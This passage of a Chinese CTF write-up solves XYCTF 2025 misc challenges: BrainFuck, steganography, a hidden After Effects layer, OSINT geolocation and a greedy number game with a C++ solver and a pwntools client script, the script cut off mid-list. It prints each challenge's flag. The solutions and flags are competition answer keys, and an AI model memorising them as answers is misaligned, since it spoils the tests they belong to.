<p>BrainFuck，但是观察到没有 <code>.</code> 来输出，在每部分后加上即可</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;+++++++++++++++++[&lt;++++++&gt;-+-+-+-]&lt;.[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;.[-]&gt;++++++++++++[&lt;+++++++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;.[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;.[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++[&lt;++++++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;.[-]&gt;++++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;.[-]&gt;++++++++++[&lt;+++++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;.[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;.[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;.[-]&gt;++++++++++[&lt;+++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;+&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++[&lt;+++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++[&lt;++++++++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++[&lt;++&gt;-+-+-+-]&lt;.[-]&gt;++++++++[&lt;++++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++[&lt;+++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++[&lt;+++++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++++++[&lt;++++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++[&lt;+++&gt;-+-+-+-]&lt;.[-]&gt;+++++++++++++++++++++++++[&lt;+++++&gt;-+-+-+-]&lt;.[-]</span><br></pre></td></tr></table></figure>

<p>flag{W3lC0me_t0_XYCTF_2025_Enj07_1t!}</p>
<h3 id=""><a href="#" class="headerlink" title="&lt;曼波曼波曼波"></a>&lt;曼波曼波曼波</h3><p>smn.txt的base64逆序，后发现jpg文件头，保存为文件</p>
<p><img src="/download.jpg" loading="lazy">														</p>
<p>010查看发现后面跟了PK，binwalk分解得到压缩包</p>
<p>提示说，密码是什么来着，有点记不清了，呜呜呜呜 好像是什么比赛名字加年份</p>
<p>还以为有什么其他的，掩码爆破了一下发现密码确实是XYCTF2025</p>
<p>给了两张一样的图片，双图盲水印秒了</p>
<p><img src="/EASY_1_decpy3.png" loading="lazy"></p>
<h3 id="MADer也要当CTFer"><a href="#MADer也要当CTFer" class="headerlink" title="MADer也要当CTFer"></a>MADer也要当CTFer</h3><p>提取mkv文件的字幕轨subs.ass</p>
<p>发现是一堆hex提取出一个RIFX开头的文件，发现是一个aep文件</p>
<p>使用ae打开，发现有图层</p>
<p><img src="/1743836629066-03a76683-7499-468d-85f3-3fb10439a989.png" loading="lazy"></p>
<p>取消设置隐藏”消隐”的图层，可以看到有一写文字，flag在flag2这个文本中，需要调一下缩放就可以复制其中的内容了。</p>
<p><img src="/1743836639502-b7bffbac-436b-46f2-befe-b8721af93a21.png" loading="lazy"></p>
<p>flag{l_re@IIy_w@nn@_2_Ie@rn_AE}</p>
<h3 id="会飞的雷克萨斯"><a href="#会飞的雷克萨斯" class="headerlink" title="会飞的雷克萨斯"></a>会飞的雷克萨斯</h3><p>看图猜到是之前小孩炸车事件，直接百度该事件。</p>
<p><img src="/QQ_1743832187198.png" loading="lazy"></p>
<p>得到地址：四川省内江市资中县春岚北路</p>
<p>后面XXXXXX内通过地图看应该是中铁城市中心</p>
<p><img src="/QQ_1743832241003.png" loading="lazy"></p>
<p>flag{四川省内江市资中县春岚北路中铁城市中心内}</p>
<h3 id="XGCTF"><a href="#XGCTF" class="headerlink" title="XGCTF"></a>XGCTF</h3><p>搜索关键词找到题目名称：<strong>easy_polluted</strong></p>
<p><img src="/QQ_1743832317067.png" loading="lazy"></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/52464567/1743832324744-64f7289f-3287-4b94-996f-1b63731e7717.png" loading="lazy"></p>
<p>github可以搜到dragonkeep</p>
<p>通过访问他的.github.io会重定位到</p>
<p><img src="/QQ_1743832409731.png" loading="lazy"></p>
<p>找到第一篇文章。</p>
<p><img src="/QQ_1743832453654.png" loading="lazy"></p>
<p>f12找到flag进行base64解密。</p>
<p><img src="/QQ_1743832482740.png" loading="lazy">flag{1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me}</p>
<h3 id="Greedymen"><a href="#Greedymen" class="headerlink" title="Greedymen"></a>Greedymen</h3><p>将题目和思路发给claude写出计算优解代码</p>
<p>思路：先拿最大质数；从其他质数相关的大合数开始取；给对面拿最少分数前提取剩下的数字</p>
<p>算法代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">getFactors</span><span class="params">(<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; factors;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (n % i == <span class="number">0</span>)</span><br><span class="line">            factors.<span class="built_in">push_back</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> factors;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isPrime</span><span class="params">(<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i * i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (n % i == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Evaluation</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> immediateGain;</span><br><span class="line">    <span class="type">int</span> futureImpact;</span><br><span class="line">    <span class="type">int</span> numFactors;</span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>&lt;(<span class="type">const</span> Evaluation &amp;other) <span class="type">const</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (immediateGain != other.immediateGain)</span><br><span class="line">            <span class="keyword">return</span> immediateGain &lt; other.immediateGain;</span><br><span class="line">        <span class="keyword">if</span> (futureImpact != other.futureImpact)</span><br><span class="line">            <span class="keyword">return</span> futureImpact &lt; other.futureImpact;</span><br><span class="line">        <span class="keyword">return</span> numFactors &gt; other.numFactors;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> NEG_INF = <span class="number">-1000000000</span>; <span class="comment">// 使用整数常量</span></span><br><span class="line"></span><br><span class="line"><span class="function">Evaluation <span class="title">evaluateChoice</span><span class="params">(<span class="type">int</span> num, <span class="type">const</span> set&lt;<span class="type">int</span>&gt; &amp;usedNumbers, <span class="type">int</span> maxNum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; factors = <span class="built_in">getFactors</span>(num);</span><br><span class="line">    <span class="type">int</span> opponentGain = <span class="number">0</span>;</span><br><span class="line">    set&lt;<span class="type">int</span>&gt; newUsed = usedNumbers;</span><br><span class="line">    newUsed.<span class="built_in">insert</span>(num);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> factor : factors)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (factor != num &amp;&amp; usedNumbers.<span class="built_in">find</span>(factor) == usedNumbers.<span class="built_in">end</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            opponentGain += factor;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> futureOptions = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = maxNum; i &gt;= <span class="number">2</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (newUsed.<span class="built_in">find</span>(i) == newUsed.<span class="built_in">end</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; iFactors = <span class="built_in">getFactors</span>(i);</span><br><span class="line">            <span class="type">bool</span> hasUnusedFactor = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> f : iFactors)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (f != i &amp;&amp; newUsed.<span class="built_in">find</span>(f) == newUsed.<span class="built_in">end</span>())</span><br><span class="line">                &#123;</span><br><span class="line">                    hasUnusedFactor = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (hasUnusedFactor)</span><br><span class="line">                futureOptions++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;num - opponentGain, futureOptions, (<span class="type">int</span>)factors.<span class="built_in">size</span>()&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solveLevel</span><span class="params">(<span class="type">int</span> maxNum, <span class="type">int</span> moves)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    set&lt;<span class="type">int</span>&gt; used;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; choices;</span><br><span class="line">    <span class="type">int</span> myScore = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> opponentScore = <span class="number">0</span>;</span><br><span class="line">    map&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;&gt; factorMap;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 预计算所有数的因数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= maxNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        factorMap[i] = <span class="built_in">getFactors</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (moves &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> bestNum = <span class="number">-1</span>;</span><br><span class="line">        Evaluation bestEval = &#123;NEG_INF, NEG_INF, <span class="number">1000</span>&#125;; <span class="comment">// 使用整数常量</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = maxNum; i &gt;= <span class="number">2</span>; i--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (used.<span class="built_in">find</span>(i) != used.<span class="built_in">end</span>())</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">bool</span> hasUnusedFactor = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> factor : factorMap[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (factor != i &amp;&amp; used.<span class="built_in">find</span>(factor) == used.<span class="built_in">end</span>())</span><br><span class="line">                &#123;</span><br><span class="line">                    hasUnusedFactor = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!hasUnusedFactor)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            Evaluation eval = <span class="built_in">evaluateChoice</span>(i, used, maxNum);</span><br><span class="line">            <span class="keyword">if</span> (bestEval &lt; eval)</span><br><span class="line">            &#123;</span><br><span class="line">                bestEval = eval;</span><br><span class="line">                bestNum = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bestNum == <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        choices.<span class="built_in">push_back</span>(bestNum);</span><br><span class="line">        myScore += bestNum;</span><br><span class="line">        used.<span class="built_in">insert</span>(bestNum);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> factor : factorMap[bestNum])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (factor != bestNum &amp;&amp; used.<span class="built_in">find</span>(factor) == used.<span class="built_in">end</span>())</span><br><span class="line">            &#123;</span><br><span class="line">                opponentScore += factor;</span><br><span class="line">                used.<span class="built_in">insert</span>(factor);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        moves--;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 计算剩余数字</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= maxNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (used.<span class="built_in">find</span>(i) == used.<span class="built_in">end</span>())</span><br><span class="line">        &#123;</span><br><span class="line">            opponentScore += i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Level &quot;</span> &lt;&lt; maxNum &lt;&lt; <span class="string">&quot; (&quot;</span> &lt;&lt; moves &lt;&lt; <span class="string">&quot; moves):\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;choices = [&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; choices.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; choices[i];</span><br><span class="line">        <span class="keyword">if</span> (i &lt; choices.<span class="built_in">size</span>() - <span class="number">1</span>)</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;, &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;]\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;My Score: &quot;</span> &lt;&lt; myScore &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Opponent Score: &quot;</span> &lt;&lt; opponentScore &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Score Difference: &quot;</span> &lt;&lt; myScore - opponentScore &lt;&lt; <span class="string">&quot;\n\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">solveLevel</span>(<span class="number">50</span>, <span class="number">19</span>);  <span class="comment">// Level 1</span></span><br><span class="line">    <span class="built_in">solveLevel</span>(<span class="number">100</span>, <span class="number">37</span>); <span class="comment">// Level 2</span></span><br><span class="line">    <span class="built_in">solveLevel</span>(<span class="number">200</span>, <span class="number">76</span>); <span class="comment">// Level 3</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Level <span class="number">50</span> (<span class="number">0</span> moves):</span><br><span class="line">choices = [<span class="number">47</span>, <span class="number">49</span>, <span class="number">35</span>, <span class="number">39</span>, <span class="number">26</span>, <span class="number">46</span>, <span class="number">33</span>, <span class="number">45</span>, <span class="number">38</span>, <span class="number">44</span>, <span class="number">34</span>, <span class="number">50</span>, <span class="number">30</span>, <span class="number">28</span>, <span class="number">42</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">36</span>]</span><br><span class="line">My Score: <span class="number">718</span></span><br><span class="line">Opponent Score: <span class="number">557</span></span><br><span class="line">Score Difference: <span class="number">161</span></span><br><span class="line"></span><br><span class="line">Level <span class="number">100</span> (<span class="number">0</span> moves):</span><br><span class="line">choices = [<span class="number">97</span>, <span class="number">95</span>, <span class="number">91</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">93</span>, <span class="number">62</span>, <span class="number">87</span>, <span class="number">99</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">69</span>, <span class="number">86</span>, <span class="number">92</span>, <span class="number">63</span>, <span class="number">82</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">74</span>, <span class="number">88</span>, <span class="number">54</span>, <span class="number">98</span>, <span class="number">75</span>, <span class="number">50</span>, <span class="number">100</span>, <span class="number">70</span>, <span class="number">68</span>, <span class="number">56</span>, <span class="number">84</span>, <span class="number">60</span>, <span class="number">90</span>, <span class="number">52</span>, <span class="number">78</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">48</span>, <span class="number">72</span>]</span><br><span class="line">My Score: <span class="number">2856</span></span><br><span class="line">Opponent Score: <span class="number">2194</span></span><br><span class="line">Score Difference: <span class="number">662</span></span><br><span class="line"></span><br><span class="line">Level <span class="number">200</span> (<span class="number">0</span> moves):</span><br><span class="line">choices = [<span class="number">199</span>, <span class="number">187</span>, <span class="number">169</span>, <span class="number">185</span>, <span class="number">161</span>, <span class="number">155</span>, <span class="number">183</span>, <span class="number">122</span>, <span class="number">177</span>, <span class="number">145</span>, <span class="number">175</span>, <span class="number">133</span>, <span class="number">159</span>, <span class="number">171</span>, <span class="number">153</span>, <span class="number">194</span>, <span class="number">141</span>, <span class="number">188</span>, <span class="number">178</span>, <span class="number">129</span>, <span class="number">172</span>, <span class="number">166</span>, <span class="number">123</span>, <span class="number">164</span>, <span class="number">158</span>, <span class="number">117</span>, <span class="number">195</span>, <span class="number">130</span>, <span class="number">105</span>, <span class="number">189</span>, <span class="number">147</span>, <span class="number">135</span>, <span class="number">98</span>, <span class="number">196</span>, <span class="number">182</span>, <span class="number">165</span>, <span class="number">110</span>, <span class="number">154</span>, <span class="number">148</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">156</span>, <span class="number">104</span>, <span class="number">114</span>, <span class="number">190</span>, <span class="number">152</span>, <span class="number">142</span>, <span class="number">102</span>, <span class="number">170</span>, <span class="number">136</span>, <span class="number">134</span>, <span class="number">126</span>, <span class="number">124</span>, <span class="number">186</span>, <span class="number">90</span>, <span class="number">180</span>, <span class="number">140</span>, <span class="number">116</span>, <span class="number">174</span>, <span class="number">120</span>, <span class="number">80</span>, <span class="number">160</span>, <span class="number">128</span>, <span class="number">112</span>, <span class="number">168</span>, <span class="number">108</span>, <span class="number">162</span>, <span class="number">100</span>, <span class="number">150</span>, <span class="number">96</span>, <span class="number">144</span>, <span class="number">92</span>, <span class="number">138</span>, <span class="number">88</span>, <span class="number">132</span>, <span class="number">198</span>]</span><br><span class="line">My Score: <span class="number">11094</span></span><br><span class="line">Opponent Score: <span class="number">9006</span></span><br><span class="line">Score Difference: <span class="number">2088</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;47.94.204.178&quot;</span>,<span class="number">26629</span> )</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;3.Quit\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这边打的时候Level1使用的是之前手动取的值</span></span><br><span class="line">nums=[[<span class="number">47</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">39</span>, <span class="number">27</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">40</span>, <span class="number">42</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">48</span>, <span class="number">50</span>, <span class="number">38</span>, <span class="number">36</span>, <span class="number">34</span>],</span><br><span class="line">      [<span class="number">97</span>, <span class="number">95</span>, <span class="number">91</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">93</span>, <span class="number">62</span>, <span class="number">87</span>, <span class="number">99</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">69</span>, <span class="number">86</span>, <span class="number">92</span>, <span class="number">63</span>, <span class="number">82</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">74</span>, <span class="number">88</span>, <span class="number">54</span>, <span class="number">98</span>, <span class="number">75</span>, <span class="number">50</span>, <span class="number">100</span>, <span class="number">70</span>, <span class="number">68</span>, <span class="number">56</span>, <span class="number">84</span>, <span class="number">60</span>, <span class="number">90</span>, <span class="number">52</span>, <span class="number">78</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">96</span>, <span class="number">72</span>],</span><br><span class="line">      [<span class="number">199</span>, <span class="number">187</span>, <span class="number">169</span>, <span class="number">185</span>, <span class="number">161</span>, <span class="number">155</span>, <span class="number">183</span>, <span class="number">122</span>, <span class="number">177</span>, <span class="number">145</span>, <span class="number">175</span>, <span class="number">133</span>, <span class="number">159</span>, <span class="number">171</span>, <span class="number">153</span>, <span class="number">194</span>, <span class="number">141</span>, <span class="number">188</span>, <span class="number">178</span>, <span class="number">129</span>, <span class="number">172</span>, <span class="number">166</span>, <span class="number">123</span>, <span class="number">164</span>, <span class="number">158</span>, <span class="number">117</span>, <span class="number">195</span>, <span class="number">130</span>, <span class="number">105</span>, <span class="number">189</span>, <span class="number">147</span>, <span class="number">135</span>, <span class="number">98</span>, <span class="number">196</span>, <span class="number">182</span>, <span class="number">165</span>, 